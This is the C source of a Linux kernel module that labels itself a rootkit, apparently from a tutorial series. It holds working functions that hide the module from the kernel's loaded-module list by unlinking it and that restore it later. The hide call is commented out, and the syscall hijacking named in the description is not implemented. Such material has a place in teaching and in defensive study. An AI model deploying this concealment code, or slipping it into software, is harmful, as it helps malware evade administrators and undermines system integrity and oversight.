#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Syscall hijacking to send custom signals");
MODULE_VERSION("0.02");

static struct list_head *prev_module;
static short hidden = 0;

/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */
void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}


/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

//    hideme();
    return 0;
}

static void __exit rootkit_exit(void)
{
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
